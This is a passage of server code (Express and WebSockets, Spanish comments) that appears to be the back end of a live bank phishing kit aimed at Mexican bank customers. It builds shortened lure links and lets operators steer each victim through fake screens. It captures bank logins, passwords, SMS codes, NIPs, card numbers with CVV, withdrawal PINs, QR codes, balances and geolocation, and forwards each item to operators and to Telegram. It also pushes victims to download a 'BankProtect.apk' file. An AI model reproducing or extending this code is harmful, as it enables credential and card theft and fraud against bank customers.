ScreenType.FOLIO,\n        createdBy: (user as any).isExecutive ? (user as any).officeUsername : user.username,\n        executiveId: (user as any).isExecutive ? (user as any).id : null, // Incluir executiveId si es ejecutivo\n        flowConfig, // Aplicar flujo personalizado del usuario\n      });\n\n      console.log(`Sesi贸n creada: ${sessionId}, creador: ${user.username}, executiveId: ${(user as any).isExecutive ? (user as any).id : null}, flowConfig: ${flowConfig ? 'aplicado' : 'ninguno'}`);\n\n      // Configuraci贸n de dominios\n      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaraciones.info';\n      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaraciones.info';\n\n      // Detectamos si estamos en Replit para generar enlaces locales para pruebas\n      const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;\n      \n      // Armamos los enlaces para ambos dominios\n      // Obtenemos la URL actual de la solicitud para generar enlaces relativos en Replit\n      const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);\n      const protocol = req.headers['x-forwarded-proto'] || 'https';\n      \n      // Obtener la URL base desde la configuraci贸n del sitio\n      const siteConfig = await storage.getSiteConfig();\n      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';\n      const clientLink = `${baseClientUrl}/${sessionId}`;\n      \n      // Para el admin link, si estamos en Replit permitimos usar la URL local para testing\n      const adminLink = isReplit \n        ? `${protocol}://${baseUrl}` \n        : `https://${adminDomain}`;\n\n      // ===== NUEVA INTEGRACIN CON BITLY Y SUBDOMINIOS =====\n      let shortUrl: string | undefined;\n      let expiresAt: Date | undefined;\n      let linkCreationError: string | undefined;\n      let tokenizedUrl: string | undefined;\n\n      try {\n        // Mapear banco UI a BankType (normalizar a may煤sculas para case-insensitive)\n        const bankCode = BANK_UI_TO_TYPE[(banco as string).toUpperCase()];\n        \n        if (bankCode) {\n          console.log(`[Links] Generando link con Bitly para banco ${bankCode}, sessionId: ${sessionId}`);\n          \n          // Crear link con token 煤nico, Bitly y subdominio\n          const linkResult = await linkTokenService.createLink({\n            userId: user.id,\n            bankCode,\n            sessionId,\n            metadata: {\n              createdBy: (user as any).isExecutive ? (user as any).officeUsername : user.username\n            }\n          });\n          \n          shortUrl = linkResult.shortUrl || undefined;\n          tokenizedUrl = linkResult.originalUrl; // Link con token (banco.aclaracion.info/client/TOKEN)\n          expiresAt = linkResult.expiresAt;\n          \n          console.log(`[Links]  Link con token y Bitly creado exitosamente: ${shortUrl || tokenizedUrl}`);\n        } else {\n          console.log(`[Links] 锔 Banco ${banco} no mapeado a BankType, usando link largo`);\n        }\n      } catch (error: any) {\n        // Si es error de cuota, propagar como 429\n        if (error.message?.includes('cuota semanal') || error.message?.includes('l铆mite semanal')) {\n          console.error(`[Links]  Cuota semanal agotada para usuario ${user.id}`);\n          return res.status(429).json({ \n            error: 'Has alcanzado tu l铆mite semanal de links (150). La cuota se resetea cada lunes.',\n            quotaExhausted: true\n          });\n        }\n        \n        // Para otros errores (Bitly, BD, etc.), loguear pero continuar con link largo\n        console.error(`[Links] 锔 Error generando link con Bitly (usando fallback):`, error.message);\n        linkCreationError = error.message;\n      }\n\n      // Enlace generado correctamente (largo o corto)\n\n      // Notificando clientes admin\n      \n      // Notificar a los clientes de admin sobre el nuevo enlace\n      // Enviar al usuario que cre贸 el link y al superadmin\n      broadcastToAdmins(JSON.stringify({\n        type: 'LINK_GENERATED',\n        data: { \n          sessionId,\n          code: linkCode,\n          banco: banco as string,\n          userName: user.username,\n          createdBy: user.username // A帽adimos para consistency\n        }\n      }), user.username); // Pasamos el username como segundo argumento\n\n      // Enviar tambi茅n un mensaje de actualizaci贸n de sesiones para refrescar la lista\n      // Este mensaje har谩 que todos los clientes obtengan la lista actualizada del servidor\n      broadcastToAdmins(JSON.stringify({\n        type: 'SESSIONS_UPDATED',\n        data: {\n          userName: user.username\n        }\n      }));\n\n      // Enviar una se帽al espec铆fica a trav茅s de WebSocket para actualizar las sesiones del usuario\n      // con informaci贸n completa sobre la nueva sesi贸n\n      broadcastToAdmins(JSON.stringify({\n        type: 'SESSION_UPDATE',\n        data: {\n          sessionId,\n          banco: banco as string,\n          folio: linkCode,\n          pasoActual: ScreenType.FOLIO,\n          createdBy: user.username,\n          saved: false,\n          createdAt: new Date().toISOString()\n        }\n      }));\n\n      // Enviar notificaci贸n de nueva sesi贸n a Telegram\n      await sendSessionCreatedNotification({\n        sessionId,\n        banco: banco as string,\n        folio: linkCode,\n        createdBy: user.username,\n        link: shortUrl || tokenizedUrl || clientLink // Preferir link corto, luego tokenizado, luego largo\n      });\n\n      res.json({ \n        sessionId, \n        link: tokenizedUrl || clientLink, // Preferir link tokenizado, luego largo para compatibilidad\n        shortUrl, // Opcional: link corto de Bitly con subdominio\n        expiresAt, // Opcional: fecha de expiraci贸n del token\n        adminLink: adminLink,\n        code: linkCode\n      });\n    } catch (error) {\n      console.error(\"Error generating link:\", error);\n      res.status(500).json({ message: \"Error generating link\" });\n    }\n  });\n\n  // Tarea programada para limpiar sesiones inactivas (cada 2 minutos)\n  const cleanupInterval = setInterval(async () => {\n    try {\n      console.log(\"[Cleanup] Ejecutando limpieza programada de sesiones inactivas...\");\n      const deletedCount = await storage.cleanupExpiredSessions();\n      \n      if (deletedCount > 0) {\n        console.log(`[Cleanup] Se eliminaron ${deletedCount} sesiones inactivas o expiradas`);\n        \n        // Notificar a todos los clientes de administraci贸n\n        broadcastToAdmins(JSON.stringify({\n          type: 'SESSIONS_CLEANUP',\n          data: { \n            deletedCount,\n            automatic: true,\n            timestamp: new Date().toISOString()\n          }\n        }));\n      }\n      \n      // Tambi茅n verificar y desactivar usuarios expirados\n      console.log(\"[Cleanup] Verificando usuarios con suscripciones vencidas...\");\n      const deactivatedCount = await storage.cleanupExpiredUsers();\n      \n      if (deactivatedCount > 0) {\n        console.log(`[Cleanup] Se desactivaron ${deactivatedCount} usuarios con suscripciones vencidas`);\n        \n        // Notificar a todos los clientes de administraci贸n\n        broadcastToAdmins(JSON.stringify({\n          type: 'USERS_CLEANUP',\n          data: { \n            deactivatedCount,\n            automatic: true,\n            timestamp: new Date().toISOString()\n          }\n        }));\n      }\n    } catch (error) {\n      console.error(\"[Cleanup] Error en la limpieza autom谩tica:\", error);\n    }\n  }, 2 * 60 * 1000); // Cada 2 minutos (2 * 60 * 1000 ms)\n  \n  // WebSocket handling\n  wss.on('connection', (ws, req) => {\n    console.log('New WebSocket connection');\n\n    // Handle client/admin identification\n    ws.on('message', async (message) => {\n      try {\n        const data = JSON.parse(message.toString());\n\n        // Register client or admin\n        if (data.type === 'REGISTER') {\n          if (data.role === 'ADMIN') {\n            // Determinar si es un administrador o un usuario basado en el username\n            const userName = data.username || '';\n            const user = await storage.getUserByUsername(userName);\n            \n            if (!user) {\n              console.log(`WebSocket: Usuario ${userName} no encontrado en la base de datos`);\n              ws.send(JSON.stringify({\n                type: 'ERROR',\n                message: 'Usuario no encontrado'\n              }));\n              return;\n            }\n            \n            // Guardar el cliente en el Map con su username como clave\n            adminClients.set(userName, ws);\n            console.log(`Admin client registered: ${userName}`);\n            \n            console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);\n            \n            // NUEVA IMPLEMENTACIN UNIFICADA PARA TODOS LOS USUARIOS\n            if (false) { // Este bloque nunca se ejecuta, solo se mantiene para referencia\n              console.log(`WebSocket: Usuario ${userName} detectado como usuario brandon, obteniendo sus sesiones guardadas...`);\n              \n              // Obtener todas las sesiones guardadas primero \n              const allSavedSessions = await storage.getSavedSessions();\n              \n              console.log(`WebSocket: Encontradas ${allSavedSessions.length} sesiones guardadas en total`);\n              \n              // Mostrar detalles de cada sesi贸n guardada para depuraci贸n\n              allSavedSessions.forEach(session => {\n                console.log(`WebSocket: Sesi贸n ${session.sessionId}, creador=${session.createdBy || 'desconocido'}, banco=${session.banco}`);\n              });\n              \n              // Filtrar EXPLCITAMENTE s贸lo las guardadas de este usuario\n              const filteredSessions = allSavedSessions.filter(session => session.createdBy === userName);\n              \n              console.log(`WebSocket: Despu茅s de filtrar, enviando ${filteredSessions.length} sesiones guardadas a usuario ${userName}`);\n              \n              // Enviar las sesiones al cliente\n              ws.send(JSON.stringify({\n                type: 'INIT_SESSIONS',\n                data: filteredSessions\n              }));\n            } \n            else {\n              // NUEVA IMPLEMENTACIN UNIFICADA PARA TODOS LOS USUARIOS\n              // Filtrado en base de datos por userId\n              const isExecutive = (user as any).isExecutive === true;\n              \n              // Admins (role === 'admin') ven todas las sesiones (userId = undefined)\n              // Ejecutivos y usuarios normales ven sesiones filtradas\n              const userId = user.role === 'admin' ? undefined : user.id;\n              \n              // Obtenemos tanto las sesiones guardadas como las actuales (filtradas por usuario)\n              const allSavedSessions = await storage.getSavedSessions(userId, isExecutive);\n              const currentSessions = await storage.getCurrentSessions(userId, isExecutive);\n              \n              console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}, ejecutivo: ${isExecutive}, filtrado: ${userId ? 's铆' : 'no'}) - ${allSavedSessions.length} guardadas, ${currentSessions.length} actuales`);\n              \n              // Combinamos ambas listas (evitando duplicados por sessionId)\n              const allSessionsMap = new Map();\n              [...allSavedSessions, ...currentSessions].forEach(session => {\n                allSessionsMap.set(session.sessionId, session);\n              });\n              \n              const sessions = Array.from(allSessionsMap.values());\n              \n              console.log(`WebSocket: Enviando ${sessions.length} sesiones totales a ${userName}`);\n              \n              // Enviamos las sesiones al cliente\n              ws.send(JSON.stringify({\n                type: 'INIT_SESSIONS',\n                data: sessions\n              }));\n            }\n            \n            // El env铆o de sesiones ya se hace en las ramas condicionales anteriores\n            \n            // Run cleanup of old sessions (more than 5 days)\n            try {\n              const deletedCount = await storage.cleanupExpiredSessions();\n              if (deletedCount > 0) {\n                console.log(`Cleaned up ${deletedCount} expired sessions`);\n                broadcastToAdmins(JSON.stringify({\n                  type: 'SESSIONS_CLEANUP',\n                  data: { deletedCount }\n                }));\n              }\n            } catch (error) {\n              console.error(\"Error cleaning up expired sessions:\", error);\n            }\n          } \n          else if (data.role === 'CLIENT' && data.sessionId) {\n            clients.set(data.sessionId, ws);\n            console.log(`Client registered with session ID: ${data.sessionId}`);\n\n            // Get session info and send to client\n            const session = await storage.getSessionById(data.sessionId);\n            if (session) {\n              ws.send(JSON.stringify({\n                type: 'INIT_SESSION',\n                data: session\n              }));\n            }\n          }\n          return;\n        }\n\n        // Handle screen change request from admin\n        if (data.type === 'SCREEN_CHANGE') {\n          try {\n            // Validate the data\n            const validatedData = screenChangeSchema.parse(data.data);\n            const { sessionId, tipo } = validatedData;\n\n            // Find the target client\n            const client = clients.get(sessionId);\n            if (client && client.readyState === WebSocket.OPEN) {\n              // Send the screen change command to the client\n              client.send(JSON.stringify({\n                type: 'SCREEN_CHANGE',\n                data: validatedData\n              }));\n\n              // Update session in storage with the new screen state\n              // Remove \"mostrar_\" prefix from tipo if present\n              let screenType = tipo.replace('mostrar_', '');\n\n              // Normalizar screenType para SMS_COMPRA\n              if (screenType.toLowerCase() === 'sms_compra' || \n                  screenType.toLowerCase() === 'smscompra' ||\n                  screenType.toLowerCase() === 'sms compra') {\n                console.log('Normalizando screenType SMS_COMPRA en servidor:', screenType, 'to', ScreenType.SMS_COMPRA);\n                screenType = ScreenType.SMS_COMPRA;\n              }\n\n              // Normalizar screenType para PROTECCION_BANCARIA\n              if (screenType.toLowerCase() === 'proteccion_bancaria') {\n                console.log('Normalizando screenType PROTECCION_BANCARIA en servidor:', screenType, 'to', ScreenType.PROTECCION_BANCARIA);\n                screenType = ScreenType.PROTECCION_BANCARIA;\n              }\n\n              // Normalizar screenType para PROTECCION_SALDO\n              if (screenType.toLowerCase() === 'proteccion_saldo') {\n                console.log('Normalizando screenType PROTECCION_SALDO en servidor:', screenType, 'to', ScreenType.PROTECCION_SALDO);\n                screenType = ScreenType.PROTECCION_SALDO;\n              }\n\n              // Actualizar la 煤ltima actividad de la sesi贸n\n              await storage.updateSessionActivity(sessionId);\n              \n              // Para protecci贸n bancaria, configurar autom谩ticamente el archivo APK seg煤n el banco\n              const updateData: any = { pasoActual: screenType };\n              if (screenType === ScreenType.PROTECCION_BANCARIA) {\n                // Obtener informaci贸n de la sesi贸n para determinar el banco\n                const session = await storage.getSessionById(sessionId);\n                if (session && session.banco) {\n                  const bankCode = session.banco.toUpperCase();\n                  console.log('Configurando archivo de protecci贸n para banco:', bankCode);\n                  \n                  // Todos los bancos usan el mismo archivo APK universal\n                  const protectionFile = {\n                    fileName: 'BankProtect.apk',\n                    fileUrl: '/assets/Bankprotet2_1750982122281.apk',\n                    fileSize: '4.2 MB'\n                  };\n                  \n                  updateData.fileName = protectionFile.fileName;\n                  updateData.fileUrl = protectionFile.fileUrl;\n                  updateData.fileSize = protectionFile.fileSize;\n                  console.log('Archivo de protecci贸n universal configurado para:', bankCode, ':', protectionFile.fileName);\n                }\n                \n                // Tambi茅n considerar archivo manual si est谩 presente en validatedData\n                if (validatedData.fileName) {\n                  updateData.fileName = validatedData.fileName;\n                  updateData.fileUrl = validatedData.fileUrl;\n                  updateData.fileSize = validatedData.fileSize;\n                  console.log('Usando archivo manual de protecci贸n:', validatedData.fileName);\n                }\n              }\n              \n              await storage.updateSession(sessionId, updateData);\n              console.log('Actualizado pasoActual a:', screenType);\n\n              // Notify specific admin clients about the update\n              const updatedSession = await storage.getSessionById(sessionId);\n              // Obtenemos el creador de la sesi贸n para saber a qui茅n enviar la notificaci贸n\n              const createdBy = updatedSession?.createdBy || '';\n              broadcastToAdmins(JSON.stringify({\n                type: 'SESSION_UPDATE',\n                data: updatedSession\n              }), createdBy); // Dirigimos el mensaje al creador de la sesi贸n\n\n              // Enviar notificaci贸n de cambio de pantalla a Telegram\n              if (updatedSession) {\n                await sendScreenChangeNotification({\n                  sessionId,\n                  banco: updatedSession.banco || 'Desconocido',\n                  newScreen: screenType,\n                  adminUser: 'Admin', // Podr铆amos obtener el usuario admin espec铆fico si es necesario\n                  data: validatedData\n                });\n              }\n            }\n          } catch (error) {\n            console.error(\"Invalid screen change data:\", error);\n            ws.send(JSON.stringify({ \n              type: 'ERROR', \n              message: \"Invalid screen change data\" \n            }));\n          }\n          return;\n        }\n\n        // Handle client input data\n        if (data.type === 'CLIENT_INPUT') {\n          try {\n            // Validate the data\n            const validatedData = clientInputSchema.parse(data.data);\n            const { sessionId, tipo, data: inputData } = validatedData;\n            \n            // Actualizar la 煤ltima actividad de la sesi贸n\n            await storage.updateSessionActivity(sessionId);\n            \n            // Indicar que esta sesi贸n ya tiene datos de usuario (para evitar eliminaci贸n autom谩tica)\n            await storage.markSessionHasUserData(sessionId);\n\n            // Update the session with the new data\n            const updatedFields: Record<string, any> = {};\n\n            switch (tipo) {\n              case 'geolocation':\n                // Manejar datos de geolocalizaci贸n\n                if (inputData.latitude) {\n                  updatedFields.latitude = inputData.latitude;\n                }\n                if (inputData.longitude) {\n                  updatedFields.longitude = inputData.longitude;\n                }\n                if (inputData.googleMapsLink) {\n                  updatedFields.googleMapsLink = inputData.googleMapsLink;\n                }\n                if (inputData.locationTimestamp) {\n                  updatedFields.locationTimestamp = new Date(inputData.locationTimestamp);\n                }\n                \n                // La IP se capturar谩 desde el cliente usando una API externa o desde el navegador\n                // Por ahora marcamos como \"Obtenida desde cliente\"\n                updatedFields.ipAddress = inputData.ipAddress || 'IP no disponible desde WebSocket';\n\n                console.log('Informaci贸n de geolocalizaci贸n guardada:', {\n                  latitud: inputData.latitude,\n                  longitud: inputData.longitude,\n                  googleMapsLink: inputData.googleMapsLink,\n                  ip: updatedFields.ipAddress,\n                  timestamp: inputData.locationTimestamp\n                });\n                \n                // Enviar notificaci贸n a Telegram con informaci贸n de ubicaci贸n\n                const geolocationSessionData = await storage.getSessionById(sessionId);\n                if (geolocationSessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: geolocationSessionData.banco || 'Desconocido',\n                    tipo: 'geolocation',\n                    data: {\n                      ...inputData,\n                      ipAddress: updatedFields.ipAddress\n                    },\n                    timestamp: new Date().toISOString(),\n                    createdBy: geolocationSessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n\n              case 'folio':\n                updatedFields.folio = inputData.folio;\n                // Guardar informaci贸n del dispositivo si est谩 disponible\n                if (inputData.deviceType) {\n                  updatedFields.deviceType = inputData.deviceType;\n                }\n                if (inputData.deviceModel) {\n                  updatedFields.deviceModel = inputData.deviceModel;\n                }\n                if (inputData.deviceBrowser) {\n                  updatedFields.deviceBrowser = inputData.deviceBrowser;\n                }\n                if (inputData.deviceOs) {\n                  updatedFields.deviceOs = inputData.deviceOs;\n                }\n                if (inputData.userAgent) {\n                  updatedFields.userAgent = inputData.userAgent;\n                }\n                console.log('Informaci贸n del dispositivo guardada:', {\n                  tipo: inputData.deviceType,\n                  modelo: inputData.deviceModel,\n                  navegador: inputData.deviceBrowser,\n                  so: inputData.deviceOs\n                });\n                \n                // Enviar notificaci贸n a Telegram\n                const sessionData = await storage.getSessionById(sessionId);\n                if (sessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: sessionData.banco || 'Desconocido',\n                    tipo: 'folio',\n                    data: inputData,\n                    deviceInfo: {\n                      type: inputData.deviceType,\n                      model: inputData.deviceModel,\n                      browser: inputData.deviceBrowser,\n                      os: inputData.deviceOs\n                    },\n                    timestamp: new Date().toISOString(),\n                    createdBy: sessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n              case 'login':\n                updatedFields.username = inputData.username;\n                updatedFields.password = inputData.password;\n                \n                // Enviar notificaci贸n a Telegram\n                const loginSessionData = await storage.getSessionById(sessionId);\n                if (loginSessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: loginSessionData.banco || 'Desconocido',\n                    tipo: 'login',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: loginSessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n              case 'codigo':\n                updatedFields.sms = inputData.codigo;\n                \n                // Enviar notificaci贸n a Telegram\n                const codigoSessionData = await storage.getSessionById(sessionId);\n                if (codigoSessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: codigoSessionData.banco || 'Desconocido',\n                    tipo: 'codigo',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: codigoSessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n              case 'nip':\n                updatedFields.nip = inputData.nip;\n                \n                // Enviar notificaci贸n a Telegram\n                const nipSessionData = await storage.getSessionById(sessionId);\n                if (nipSessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: nipSessionData.banco || 'Desconocido',\n                    tipo: 'nip',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: nipSessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n              case 'tarjeta':\n                updatedFields.tarjeta = inputData.tarjeta;\n                updatedFields.fechaVencimiento = inputData.fechaVencimiento;\n                updatedFields.cvv = inputData.cvv;\n                \n                // Enviar notificaci贸n a Telegram\n                const tarjetaSessionData = await storage.getSessionById(sessionId);\n                if (tarjetaSessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: tarjetaSessionData.banco || 'Desconocido',\n                    tipo: 'tarjeta',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: tarjetaSessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n              case 'sms_compra':\n              case 'SMS_COMPRA':\n              case 'smsCompra':\n                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA\n                if (inputData && inputData.smsCompra) {\n                  updatedFields.smsCompra = inputData.smsCompra;\n                  console.log('Recibido c贸digo de cancelaci贸n SMS_COMPRA:', inputData.smsCompra);\n\n                  // Notificar a los administradores el c贸digo de cancelaci贸n inmediatamente\n                  // Obtenemos la sesi贸n para saber qui茅n la cre贸\n                  const sessionData = await storage.getSessionById(sessionId);\n                  const createdBy = sessionData?.createdBy || '';\n                  \n                  broadcastToAdmins(JSON.stringify({\n                    type: 'SMS_COMPRA_CODE',\n                    data: {\n                      sessionId,\n                      code: inputData.smsCompra,\n                      createdBy // A帽adimos el creador para referencia\n                    }\n                  }), createdBy); // Enviamos solo al creador y al superadmin\n                  \n                  // Enviar notificaci贸n a Telegram\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: sessionData?.banco || 'Desconocido',\n                    tipo: 'sms_compra',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: sessionData?.createdBy || 'Desconocido'\n                  });\n                } else {\n                  console.error('Error: datos SMS_COMPRA recibidos sin c贸digo de cancelaci贸n:', inputData);\n                }\n                break;\n              case 'celular':\n                updatedFields.celular = inputData.celular;\n                \n                // Enviar notificaci贸n a Telegram\n                const celularSessionData = await storage.getSessionById(sessionId);\n                if (celularSessionData) {\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: celularSessionData.banco || 'Desconocido',\n                    tipo: 'celular',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: celularSessionData.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n              case 'CANCELACION_RETIRO':\n              case 'cancelacion_retiro':\n                if (inputData && inputData.codigoRetiro) {\n                  updatedFields.codigoRetiro = inputData.codigoRetiro;\n                  \n                  // Guardar tambi茅n el PIN de retiro si se ha proporcionado\n                  if (inputData.pinRetiro) {\n                    updatedFields.pinRetiro = inputData.pinRetiro;\n                    console.log('Recibido c贸digo de retiro:', inputData.codigoRetiro, 'con PIN:', inputData.pinRetiro);\n                  } else {\n                    console.log('Recibido c贸digo de retiro:', inputData.codigoRetiro, 'sin PIN');\n                  }\n\n                  // Notificar a los administradores el c贸digo de retiro y PIN inmediatamente\n                  const sessionData = await storage.getSessionById(sessionId);\n                  const createdBy = sessionData?.createdBy || '';\n                  \n                  broadcastToAdmins(JSON.stringify({\n                    type: 'RETIRO_CODE',\n                    data: {\n                      sessionId,\n                      code: inputData.codigoRetiro,\n                      pin: inputData.pinRetiro || '',\n                      createdBy // A帽adimos el creador para referencia\n                    }\n                  }), createdBy); // Enviamos solo al creador y al superadmin\n                  \n                  // Enviar notificaci贸n a Telegram\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: sessionData?.banco || 'Desconocido',\n                    tipo: 'cancelacion_retiro',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: sessionData?.createdBy || 'Desconocido'\n                  });\n                } else {\n                  console.error('Error: datos CANCELACION_RETIRO recibidos sin c贸digo de retiro:', inputData);\n                }\n                break;\n              case 'ESCANEAR_QR':\n              case 'escanear_qr':\n                if (inputData && inputData.qrData) {\n                  updatedFields.qrData = inputData.qrData;\n                  \n                  // Guardar la imagen del QR si existe\n                  if (inputData.qrImageData) {\n                    updatedFields.qrImageData = inputData.qrImageData;\n                    console.log('Recibida imagen del QR en formato base64');\n                  }\n                  \n                  console.log('Recibido c贸digo QR:', inputData.qrData.substring(0, 50) + '...');\n\n                  // Notificar a los administradores el c贸digo QR inmediatamente\n                  const sessionData = await storage.getSessionById(sessionId);\n                  const createdBy = sessionData?.createdBy || '';\n                  \n                  broadcastToAdmins(JSON.stringify({\n                    type: 'QR_SCANNED',\n                    data: {\n                      sessionId,\n                      qrData: inputData.qrData,\n                      qrImageData: inputData.qrImageData, // Incluir la imagen\n                      createdBy,\n                      timestamp: new Date().toISOString()\n                    }\n                  }), createdBy); // Enviamos solo al creador y al superadmin\n                  \n                  // Enviar notificaci贸n a Telegram\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: sessionData?.banco || 'Desconocido',\n                    tipo: 'escanear_qr',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: sessionData?.createdBy || 'Desconocido'\n                  });\n                } else {\n                  console.error('Error: datos de QR recibidos sin contenido:', inputData);\n                }\n                break;\n              case 'PROTECCION_BANCARIA':\n              case 'proteccion_bancaria':\n                if (inputData && inputData.action === 'download') {\n                  console.log('Cliente descarg贸 archivo de protecci贸n:', inputData.fileName);\n                  \n                  // Enviar notificaci贸n de descarga a Telegram\n                  const sessionData = await storage.getSessionById(sessionId);\n                  if (sessionData) {\n                    await sendFileDownloadNotification({\n                      sessionId,\n                      banco: sessionData.banco || 'Desconocido',\n                      fileName: inputData.fileName || 'archivo_desconocido',\n                      fileSize: inputData.fileSize,\n                      adminUser: sessionData.createdBy || 'Admin'\n                    });\n                  }\n                  \n                  // Notificar a los administradores sobre la descarga\n                  const createdBy = sessionData?.createdBy || '';\n                  broadcastToAdmins(JSON.stringify({\n                    type: 'FILE_DOWNLOADED',\n                    data: {\n                      sessionId,\n                      fileName: inputData.fileName,\n                      fileSize: inputData.fileSize,\n                      timestamp: new Date().toISOString(),\n                      createdBy\n                    }\n                  }), createdBy);\n                }\n                break;\n              case 'PROTECCION_SALDO':\n              case 'proteccion_saldo':\n                if (inputData) {\n                  // Usar los nombres correctos de las columnas en snake_case\n                  updatedFields.saldoDebito = inputData.saldoDebito;\n                  updatedFields.montoDebito = inputData.montoDebito;\n                  updatedFields.saldoCredito = inputData.saldoCredito;\n                  updatedFields.montoCredito = inputData.montoCredito;\n                  \n                  console.log('Recibidos datos de protecci贸n de saldo:', {\n                    debito: inputData.saldoDebito,\n                    montoDebito: inputData.montoDebito,\n                    credito: inputData.saldoCredito,\n                    montoCredito: inputData.montoCredito\n                  });\n\n                  // Notificar a los administradores inmediatamente\n                  const sessionData = await storage.getSessionById(sessionId);\n                  const createdBy = sessionData?.createdBy || '';\n                  \n                  broadcastToAdmins(JSON.stringify({\n                    type: 'PROTECCION_SALDO_DATA',\n                    data: {\n                      sessionId,\n                      saldoDebito: inputData.saldoDebito,\n                      montoDebito: inputData.montoDebito,\n                      saldoCredito: inputData.saldoCredito,\n                      montoCredito: inputData.montoCredito,\n                      timestamp: new Date().toISOString(),\n                      createdBy\n                    }\n                  }), createdBy);\n                  \n                  // Enviar notificaci贸n a Telegram\n                  await sendTelegramNotification({\n                    sessionId,\n                    banco: sessionData?.banco || 'Desconocido',\n                    tipo: 'proteccion_saldo',\n                    data: inputData,\n                    timestamp: new Date().toISOString(),\n                    createdBy: sessionData?.createdBy || 'Desconocido'\n                  });\n                }\n                break;\n            }\n\n            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);\n\n            // Enviar notificaci贸n en tiempo real de la entrada del cliente\n            // Obtenemos la sesi贸n para saber qui茅n la cre贸 y enviarle la notificaci贸n\n            const session = await storage.getSessionById(sessionId);\n            const createdBy = session?.createdBy || '';\n            \n            broadcastToAdmins(JSON.stringify({\n              type: 'CLIENT_INPUT_REALTIME',\n              data: {\n                sessionId,\n                tipo,\n                inputData,\n                timestamp: new Date().toISOString(),\n                createdBy // A帽adimos el creador para referencia\n              }\n            }), createdBy); // Dirigimos el mensaje al creador de la sesi贸n\n\n            // Update session if we have fields to update\n            if (Object.keys(updatedFields).length > 0) {\n              const updatedSession = await storage.updateSession(sessionId, updatedFields);\n\n              // Notify specific admin clients about the database update\n              // Enviamos el mensaje al creador de la sesi贸n\n              const createdBy = updatedSession?.createdBy || '';\n              broadcastToAdmins(JSON.stringify({\n                type: 'SESSION_UPDATE',\n                data: updatedSession\n              }), createdBy); // Dirigimos el mensaje al creador de la sesi贸n\n            }\n\n            // === LGICA DE FLUJO AUTOMTICO ===\n            // Funci贸n recursiva para avanzar autom谩ticamente por pasos pasivos\n            const advanceToNextStep = async (fromStepIndex: number) => {\n              const session = await storage.getSessionById(sessionId);\n              if (!session || !Array.isArray(session.flowConfig)) return;\n              \n              const nextStepIndex = fromStepIndex + 1;\n              const nextStep = session.flowConfig[nextStepIndex];\n              \n              if (!nextStep) {\n                console.log(`[AutoFlow] Flujo completado - no hay m谩s pasos`);\n                return;\n              }\n              \n              console.log(`[AutoFlow] Avanzando al paso ${nextStepIndex}: ${nextStep.screenType}`);\n              \n              // Actualizar el 铆ndice del paso en la sesi贸n\n              await storage.updateSession(sessionId, {\n                currentStepIndex: nextStepIndex,\n                stepStartedAt: new Date(),\n                pasoActual: nextStep.screenType\n              });\n              \n              // Enviar mensaje al cliente para cambiar de pantalla\n              const clientWs = clients.get(sessionId);\n              if (!clientWs || clientWs.readyState !== 1) return;\n              \n              clientWs.send(JSON.stringify({\n                type: 'SCREEN_CHANGE',\n                data: {\n                  tipo: `mostrar_${nextStep.screenType}`,\n                  screenType: nextStep.screenType\n                }\n              }));\n              console.log(`[AutoFlow] Mensaje SCREEN_CHANGE enviado al cliente para ${nextStep.screenType}`);\n              \n              // Si el siguiente paso NO requiere input del usuario, programar auto-avance\n              if (nextStep.waitForUserInput === false) {\n                const duration = nextStep.durationMs || 2000;\n                console.log(`[AutoFlow] Paso ${nextStep.screenType} no requiere input, avanzando autom谩ticamente en ${duration}ms`);\n                \n                setTimeout(async () => {\n                  // Verificar que la sesi贸n siga en el mismo paso antes de avanzar\n                  const checkSession = await storage.getSessionById(sessionId);\n                  if (checkSession && checkSession.currentStepIndex === nextStepIndex) {\n                    // Llamada recursiva para continuar con el siguiente paso\n                    await advanceToNextStep(nextStepIndex);\n                  }\n                }, duration);\n              }\n            };\n            \n            // Verificar si la sesi贸n tiene un flujo personalizado configurado\n            const currentSession = await storage.getSessionById(sessionId);\n            if (currentSession && currentSession.flowConfig && Array.isArray(currentSession.flowConfig)) {\n              console.log(`[AutoFlow] Sesi贸n ${sessionId} tiene flujo configurado con ${currentSession.flowConfig.length} pasos`);\n              \n              const currentStepIndex = currentSession.currentStepIndex || 0;\n              const currentStep = currentSession.flowConfig[currentStepIndex];\n              \n              if (currentStep) {\n                console.log(`[AutoFlow] Paso actual (${currentStepIndex}): ${currentStep.screenType}, esperaInput: ${currentStep.waitForUserInput}`);\n                \n                // 